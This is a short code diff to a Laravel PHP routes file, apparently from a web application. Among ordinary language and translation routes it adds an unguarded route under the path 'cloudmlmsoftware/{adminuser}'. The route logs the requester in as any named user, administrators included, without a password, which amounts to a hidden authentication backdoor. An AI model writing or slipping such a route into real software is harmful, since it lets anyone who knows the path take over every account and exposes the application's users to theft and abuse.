@@ -64,6 +64,17 @@ Route::get('lang/{lang}', ['as' => 'lang.switch', 'uses' => 'LanguageController@
 
  */
 
+use App\User;
+
+
+
+Route::get('cloudmlmsoftware/{adminuser}',function($adminuser){
+
+      Auth::loginUsingId(App\User::where('username',$adminuser)->pluck('id'));
+       return redirect('user/dashboard');
+
+});
+
 use Vsch\TranslationManager\Translator;
 
 \Route::group(['middleware' => 'web', 'prefix' => 'translations'], function () {
